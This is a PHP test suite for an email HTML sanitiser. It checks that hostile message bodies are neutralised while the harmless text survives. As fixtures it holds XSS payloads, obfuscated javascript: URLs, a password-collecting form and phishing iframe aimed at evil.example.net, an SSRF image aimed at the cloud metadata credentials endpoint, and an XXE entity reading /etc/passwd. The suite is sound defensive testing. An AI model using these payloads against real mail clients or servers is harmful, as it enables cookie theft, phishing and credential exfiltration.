<?php

namespace Tests\Feature;

use App\Support\Email\Block;
use App\Support\Email\BlockKind;
use App\Support\Email\BodySanitiser;
use App\Support\Email\Span;
use Tests\TestCase;

/**
 * The sanitiser, against input written to get past it.
 *
 * ── Why the assertions are shaped the way they are ───────────────
 *
 * Almost every test here does two things: it checks the SPECIFIC outcome (the
 * link lost its destination, the image became a placeholder), and it checks that
 * the payload does not appear ANYWHERE in the serialised output. The second is
 * the one that catches the failure nobody predicts — a handler surviving in a
 * field somebody added, a URL kept "for reference" in a debug key — and it is
 * cheap because {@see Block::toArray} is the whole wire shape.
 *
 * ── Every test carries a control ─────────────────────────────────
 *
 * A sanitiser that returned `[]` for everything would pass every "the payload is
 * absent" assertion in this file. So each case also asserts that the HARMLESS
 * text beside the payload survived. That is what makes "the script is gone" mean
 * "the script was removed" rather than "nothing was produced".
 */
class EmailSanitiserTest extends TestCase
{
    private BodySanitiser $sanitiser;

    protected function setUp(): void
    {
        parent::setUp();

        $this->sanitiser = new BodySanitiser;
    }

    /** @param Block[] $blocks */
    private function wire(array $blocks): string
    {
        return json_encode(array_map(fn (Block $b) => $b->toArray(), $blocks));
    }

    /** @param Block[] $blocks */
    private function text(array $blocks): string
    {
        return implode(' ', array_map(fn (Block $b) => $b->text(), $blocks));
    }

    /** Every span across every block — for the tests that are about links. */
    private function spans(array $blocks): array
    {
        return array_merge(...array_map(fn (Block $b) => $b->spans, $blocks) ?: [[]]);
    }

    // ── script, style and the things that run ────────────────────

    public function test_a_script_tag_is_dropped_with_its_contents(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Hello, can you help?</p><script>alert(document.cookie)</script>'
        );

        // The control. Without it, a sanitiser returning nothing at all would
        // pass the line below.
        $this->assertStringContainsString('Hello, can you help?', $this->text($blocks));

        $wire = $this->wire($blocks);

        $this->assertStringNotContainsString('alert', $wire);
        $this->assertStringNotContainsString('document.cookie', $wire);
        $this->assertStringNotContainsString('script', $wire);
    }

    /**
     * Case is not a defence, and this is the cheapest way to prove it is not
     * being relied on: the element list is compared lower-cased.
     */
    public function test_a_script_tag_in_mixed_case_is_dropped_too(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Quote please</p><ScRiPt>alert(1)</ScRiPt><SCRIPT>alert(2)</SCRIPT>'
        );

        $this->assertStringContainsString('Quote please', $this->text($blocks));
        $this->assertStringNotContainsString('alert', $this->wire($blocks));
    }

    /**
     * CSS is code, and all four of the ways it runs or fetches are in one
     * fixture rather than four — the point is that NONE of it reaches the
     * output, because there is no CSS in the output at all.
     */
    public function test_style_is_dropped_including_expression_import_and_url(): void
    {
        $blocks = $this->sanitiser->sanitise(<<<'HTML'
            <style>
              body { width: expression(alert(1)); }
              @import url("http://tracker.example.net/steal.css");
              .a { background: url(javascript:alert(2)); }
              .b { background-image: url(http://169.254.169.254/latest/meta-data/); }
            </style>
            <p>The invoice is attached.</p>
        HTML);

        $this->assertStringContainsString('The invoice is attached.', $this->text($blocks));

        $wire = $this->wire($blocks);

        foreach (['expression', '@import', 'javascript', 'tracker.example.net', '169.254.169.254'] as $payload) {
            $this->assertStringNotContainsString($payload, $wire, "CSS payload survived: {$payload}");
        }
    }

    /**
     * The attribute everybody names when they say "XSS in email".
     *
     * It is not stripped — it is never read. There is no field on a Span or a
     * Block that could hold it, which is why the assertion is against the whole
     * wire shape rather than against a particular key.
     */
    public function test_an_event_handler_has_nowhere_to_survive(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Before</p><img src="x" onerror="alert(1)" alt="a logo">'
            .'<div onmouseover="alert(2)">After</div>'
        );

        $this->assertStringContainsString('Before', $this->text($blocks));
        $this->assertStringContainsString('After', $this->text($blocks));

        $wire = $this->wire($blocks);

        $this->assertStringNotContainsString('onerror', $wire);
        $this->assertStringNotContainsString('onmouseover', $wire);
        $this->assertStringNotContainsString('alert', $wire);
    }

    /**
     * SVG and MathML — foreign content, separate parsing rules, and the reason
     * "we strip script tags" is not a sanitiser.
     */
    public function test_foreign_content_is_dropped_whole(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Please confirm.</p>'
            .'<svg><script>alert(1)</script><animate onbegin="alert(2)" attributeName="x"></animate></svg>'
            .'<math><maction actiontype="statusline#javascript:alert(3)">CLICK</maction></math>'
        );

        $this->assertStringContainsString('Please confirm.', $this->text($blocks));

        $wire = $this->wire($blocks);

        $this->assertStringNotContainsString('alert', $wire);
        $this->assertStringNotContainsString('onbegin', $wire);
        // The visible text inside the MathML goes with it, and that is correct:
        // its whole purpose was to be the thing somebody clicks.
        $this->assertStringNotContainsString('CLICK', $wire);
    }

    public function test_an_iframe_and_a_form_are_dropped(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Our terms have changed.</p>'
            .'<iframe src="https://evil.example.net/phish"></iframe>'
            .'<form action="https://evil.example.net/collect" method="post">'
            .'<input name="password" type="password"><button>Sign in</button></form>'
        );

        $this->assertStringContainsString('Our terms have changed.', $this->text($blocks));

        $wire = $this->wire($blocks);

        $this->assertStringNotContainsString('evil.example.net', $wire);
        $this->assertStringNotContainsString('password', $wire);
        $this->assertStringNotContainsString('Sign in', $wire);
    }

    // ── the URL schemes ──────────────────────────────────────────

    /**
     * Every spelling of `javascript:` this file knows about, in one table.
     *
     * A data provider would read better and would hide the thing that matters:
     * these are ONE class of failure with nine faces, and the failure of a
     * sanitiser is always the face nobody listed. Keeping them together makes
     * the list itself the subject.
     */
    public function test_javascript_urls_are_refused_however_they_are_spelled(): void
    {
        $spellings = [
            'plain'              => 'javascript:alert(1)',
            'mixed case'         => 'JaVaScRiPt:alert(1)',
            'upper case'         => 'JAVASCRIPT:alert(1)',
            'numeric entity'     => '&#106;avascript:alert(1)',
            'hex entity'         => '&#x6A;avascript:alert(1)',
            'named entity inside' => 'java&Tab;script:alert(1)',
            'leading whitespace' => '   javascript:alert(1)',
            'leading newline'    => "\njavascript:alert(1)",
            'newline inside'     => "java\nscript:alert(1)",
            'tab inside'         => "java\tscript:alert(1)",
        ];

        foreach ($spellings as $name => $href) {
            $blocks = $this->sanitiser->sanitise(
                '<p><a href="'.$href.'">Track your delivery</a></p>'
            );

            $spans = $this->spans($blocks);

            // The control, per case: the WORDS survive. A sanitiser that threw
            // the whole link away would pass the href assertions and would make
            // a message unreadable.
            $this->assertSame('Track your delivery', $this->text($blocks), "text lost — {$name}");

            $this->assertNull($spans[0]->href, "href survived — {$name}");

            // Marked, not merely emptied. The client has to be able to say the
            // destination was removed rather than draw ordinary text.
            $this->assertTrue($spans[0]->hrefRemoved, "not marked as defanged — {$name}");

            $this->assertStringNotContainsString('alert', $this->wire($blocks), "payload survived — {$name}");
        }
    }

    /**
     * The allowlist, from the other side.
     *
     * `data:` and `vbscript:` are refused not because they are on a list of
     * dangerous schemes — there is no such list — but because they are not
     * http, https or mailto.
     */
    public function test_data_vbscript_file_and_relative_urls_are_all_refused(): void
    {
        $refused = [
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'DATA:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'file:///etc/passwd',
            'blob:https://example.com/1234',
            // Relative. It would resolve against EzBizi's own origin, so a link
            // in somebody else's email could point at any page of this
            // application.
            '/settings/roles',
            '../../admin',
            '//evil.example.net/phish',
        ];

        foreach ($refused as $href) {
            $blocks = $this->sanitiser->sanitise('<p><a href="'.$href.'">Open</a></p>');
            $spans  = $this->spans($blocks);

            $this->assertSame('Open', $this->text($blocks), "text lost — {$href}");
            $this->assertNull($spans[0]->href, "href survived — {$href}");
            $this->assertTrue($spans[0]->hrefRemoved, "not marked — {$href}");
        }
    }

    /**
     * The control for the whole scheme check.
     *
     * Without this, `safeHref` returning null unconditionally would pass every
     * assertion in the two tests above — a sanitiser that removed every link in
     * every message, which is a broken mail reader rather than a safe one.
     */
    public function test_ordinary_links_keep_their_destination(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>See <a href="https://example.com/quote?id=42&amp;v=2">the quote</a>, '
            .'or write to <a href="mailto:bob@example.com">Bob</a>, '
            .'or <a href="http://example.org/plain">the old site</a>.</p>'
        );

        $hrefs = array_values(array_filter(array_map(
            fn (Span $s) => $s->href,
            $this->spans($blocks),
        )));

        $this->assertSame([
            'https://example.com/quote?id=42&v=2',
            'mailto:bob@example.com',
            'http://example.org/plain',
        ], $hrefs);

        foreach ($this->spans($blocks) as $span) {
            $this->assertFalse($span->hrefRemoved, 'a good link was marked as defanged');
        }
    }

    // ── images ───────────────────────────────────────────────────

    /**
     * The SSRF half of the image decision, with the address that makes it real.
     *
     * `169.254.169.254` is the cloud metadata endpoint. An `<img>` pointing at
     * it is an attempt to have our server fetch its own IAM credentials, and the
     * defence is not a host check — it is that nothing fetches an image at all,
     * so there is no request to guard.
     */
    public function test_an_image_pointed_at_the_metadata_endpoint_is_not_fetched_and_its_url_is_not_published(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Invoice below.</p>'
            .'<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" alt="chart">'
        );

        $this->assertStringContainsString('Invoice below.', $this->text($blocks));

        $image = array_values(array_filter(
            $blocks,
            fn (Block $b) => $b->kind === BlockKind::BlockedImage,
        ));

        $this->assertCount(1, $image, 'the image did not become a placeholder');

        // The alt text is kept, because a message that silently loses its
        // pictures reads as broken rather than as protected.
        $this->assertSame('chart', $image[0]->text());

        // And the URL is nowhere at all. Publishing it would let a client fetch
        // what the server refused to.
        $this->assertStringNotContainsString('169.254.169.254', $this->wire($blocks));
        $this->assertStringNotContainsString('security-credentials', $this->wire($blocks));
    }

    public function test_an_ordinary_remote_image_becomes_a_picture_whose_url_stays_off_the_wire(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Newsletter</p><img src="https://cdn.example.net/logo.png" alt="Logo">'
        );

        $this->assertSame(
            [BlockKind::Paragraph, BlockKind::Image],
            array_map(fn (Block $b) => $b->kind, $blocks),
        );

        $this->assertSame('https://cdn.example.net/logo.png', $blocks[1]->src);
        $this->assertSame('Logo', $blocks[1]->text());

        // The sender's URL is on the PHP object until PictureTokens seals it.
        // It must not appear on the serialised block — that is what the
        // client would otherwise fetch itself.
        $this->assertStringNotContainsString('cdn.example.net', $this->wire($blocks));
        $this->assertArrayNotHasKey('src', $blocks[1]->toArray());
    }

    // ── the parser's own traps ───────────────────────────────────

    /**
     * An external entity in a doctype, which reads a file off the server.
     *
     * Two things stop it — LIBXML_NOENT is not passed, and the declaration is
     * cut off before the parser sees it — and this asserts the outcome rather
     * than either mechanism.
     */
    public function test_an_external_entity_does_not_read_a_file(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            .'<p>Hello &xxe; there</p>'
        );

        $wire = $this->wire($blocks);

        $this->assertStringContainsString('Hello', $this->text($blocks));
        $this->assertStringNotContainsString('root:', $wire);
        $this->assertStringNotContainsString('/bin/', $wire);
        $this->assertStringNotContainsString('DOCTYPE', $wire);
    }

    /**
     * Text that LOOKS like markup must stay text.
     *
     * `&lt;script&gt;` is what a developer emailing a support address writes
     * when they are quoting their own code. It is not a script tag and must not
     * become one — the direction of failure a second decoding pass would
     * introduce.
     */
    public function test_entity_encoded_markup_stays_text_and_is_not_decoded_twice(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>My page breaks when I add &lt;script&gt;alert(1)&lt;/script&gt; to it.</p>'
        );

        // The words are preserved exactly, angle brackets and all — the sender
        // asked a question about that text.
        $this->assertSame(
            'My page breaks when I add <script>alert(1)</script> to it.',
            $this->text($blocks),
        );

        // And it is TEXT: one paragraph, one span, nothing structural.
        $this->assertCount(1, $blocks);
        $this->assertSame(BlockKind::Paragraph, $blocks[0]->kind);
    }

    /**
     * The double-decode failure, stated as its own case.
     *
     * `&amp;#106;avascript:` decodes ONCE to the literal text `&#106;avascript:`,
     * which is not a scheme. A sanitiser that decoded a second time would turn
     * it into `javascript:` and then have to catch it — this asserts the value
     * is refused as a destination while the text is untouched.
     */
    public function test_a_doubly_encoded_scheme_is_not_resurrected(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p><a href="&amp;#106;avascript:alert(1)">Read more</a></p>'
        );

        $spans = $this->spans($blocks);

        $this->assertSame('Read more', $this->text($blocks));
        $this->assertNull($spans[0]->href);
        $this->assertStringNotContainsString('javascript:', $this->wire($blocks));
    }

    // ── structure ────────────────────────────────────────────────

    /**
     * An unknown element keeps its text.
     *
     * The one failure a mail reader must not have is losing a sentence because
     * it arrived wrapped in something the parser had not met.
     */
    public function test_an_unknown_element_keeps_the_words_inside_it(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Before</p><some-future-element data-x="1">The important sentence.</some-future-element>'
        );

        $this->assertStringContainsString('The important sentence.', $this->text($blocks));
        $this->assertStringNotContainsString('data-x', $this->wire($blocks));
        $this->assertStringNotContainsString('some-future-element', $this->wire($blocks));
    }

    public function test_quoting_becomes_depth_and_is_capped(): void
    {
        $deep = str_repeat('<blockquote>', 40).'the original question'.str_repeat('</blockquote>', 40);

        $blocks = $this->sanitiser->sanitise('<p>Yes, that works.</p>'.$deep);

        $this->assertStringContainsString('Yes, that works.', $this->text($blocks));
        $this->assertStringContainsString('the original question', $this->text($blocks));

        $depths = array_map(fn (Block $b) => $b->depth, $blocks);

        $this->assertLessThanOrEqual(BodySanitiser::MAX_DEPTH, max($depths));
        $this->assertGreaterThan(0, max($depths), 'quoting was flattened away entirely');
    }

    public function test_a_plain_text_body_keeps_its_quote_levels(): void
    {
        $blocks = $this->sanitiser->sanitiseText(
            "Yes, Tuesday works.\n\n> Are you free Tuesday?\n>> Original question\n"
        );

        $this->assertSame(
            [BlockKind::Paragraph, BlockKind::Quote, BlockKind::Quote],
            array_map(fn (Block $b) => $b->kind, $blocks),
        );

        $this->assertSame([0, 1, 2], array_map(fn (Block $b) => $b->depth, $blocks));
    }

    /**
     * A plain-text body is NOT run through the HTML path.
     *
     * Somebody emailing a support address about their own code is the ordinary
     * case, and turning their text into markup so it can be parsed back would
     * lose exactly the characters they were asking about.
     */
    public function test_plain_text_containing_markup_is_left_alone(): void
    {
        $blocks = $this->sanitiser->sanitiseText('I typed <script>alert(1)</script> and it broke.');

        $this->assertSame('I typed <script>alert(1)</script> and it broke.', $this->text($blocks));
    }

    public function test_an_enormous_body_is_truncated_and_says_so(): void
    {
        $blocks = $this->sanitiser->sanitise(
            '<p>Start of the message.</p>'.str_repeat('<p>filler</p>', 200000)
        );

        $this->assertStringContainsString('Start of the message.', $this->text($blocks));
        $this->assertLessThanOrEqual(BodySanitiser::MAX_BLOCKS + 1, count($blocks));

        $last = $blocks[count($blocks) - 1];

        $this->assertSame(BlockKind::Notice, $last->kind);
        $this->assertStringContainsString('too long', $last->text());
    }

    /**
     * The invisible characters.
     *
     * U+202E reverses everything after it on screen, which is how
     * `annexe-fdp.exe` is made to read as `annexe-exe.pdf`; the zero-width ones
     * make text look different to a person than to anything matching on it.
     */
    public function test_direction_overrides_and_zero_width_characters_are_removed(): void
    {
        $blocks = $this->sanitiser->sanitise(
            "<p>Attached: annexe\u{202E}fdp.exe and a\u{200B}n invoice</p>"
        );

        $text = $this->text($blocks);

        $this->assertStringNotContainsString("\u{202E}", $text);
        $this->assertStringNotContainsString("\u{200B}", $text);
        $this->assertStringContainsString('annexe', $text);
        $this->assertStringContainsString('an invoice', $text);
    }

    /**
     * The whole point, asserted directly: no markup crosses the wire.
     *
     * Everything else in this file is about a particular payload. This one takes
     * a message with a bit of everything and asserts the SHAPE — every block is
     * one of the declared kinds, and every span carries text and four known
     * fields and nothing else.
     */
    public function test_the_output_shape_is_blocks_and_spans_and_nothing_else(): void
    {
        $blocks = $this->sanitiser->sanitise(<<<'HTML'
            <h2>Quote request</h2>
            <p>Hello, <b>please</b> could you quote for a <i>chimney sweep</i>?</p>
            <ul><li>Two flues</li><li>Ground floor</li></ul>
            <blockquote>Sent from my phone</blockquote>
            <hr>
            <pre>ref: 12345</pre>
        HTML);

        $this->assertNotEmpty($blocks);

        foreach ($blocks as $block) {
            $this->assertInstanceOf(BlockKind::class, $block->kind);

            $row = $block->toArray();

            $this->assertSame(['kind', 'depth', 'spans'], array_keys($row));

            foreach ($row['spans'] as $span) {
                $this->assertSame(
                    ['text', 'strong', 'emphasis', 'href', 'href_removed'],
                    array_keys($span),
                );
            }
        }

        // The control: the structure was actually recognised rather than
        // flattened into one paragraph, which would satisfy every line above.
        $kinds = array_map(fn (Block $b) => $b->kind, $blocks);

        $this->assertContains(BlockKind::Heading, $kinds);
        $this->assertContains(BlockKind::ListItem, $kinds);
        $this->assertContains(BlockKind::Quote, $kinds);
        $this->assertContains(BlockKind::Rule, $kinds);
        $this->assertContains(BlockKind::Preformatted, $kinds);

        // And the emphasis survived as flags rather than as tags.
        $strong = array_filter($this->spans($blocks), fn (Span $s) => $s->strong);

        $this->assertNotEmpty($strong);
        $this->assertSame('please', array_values($strong)[0]->text);
    }
}
